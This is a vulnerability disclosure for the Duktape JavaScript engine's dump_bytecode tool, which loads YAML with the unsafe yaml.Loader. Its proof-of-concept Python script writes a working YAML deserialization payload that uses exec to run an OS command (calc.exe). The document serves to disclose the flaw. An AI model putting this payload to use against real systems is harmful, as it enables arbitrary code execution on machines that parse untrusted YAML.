## :writing_hand: Description

`Duktape` is an embeddable Javascript engine with a focus on portability and compact footprint. It is vulnerable to `Arbitrary Code Execution`

## :bug: Vulnerability

`dump_bytecode` submodule uses vulnerable `yaml.Loader` in `load()` function which causes code execution.

## :male_detective: Proof of Concept

#### Installation
```bash
git clone https://github.com/svaarala/duktape
```

#### Run exploit.py
```python
#!/usr/bin/env python3

from duktape.tools import dump_bytecode

payload = '''
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: "__import__('os').system('calc.exe')"
'''

with open('duk_opcodes.yaml', 'w') as f:
    f.write(payload)

    dump_bytecode.main()
```
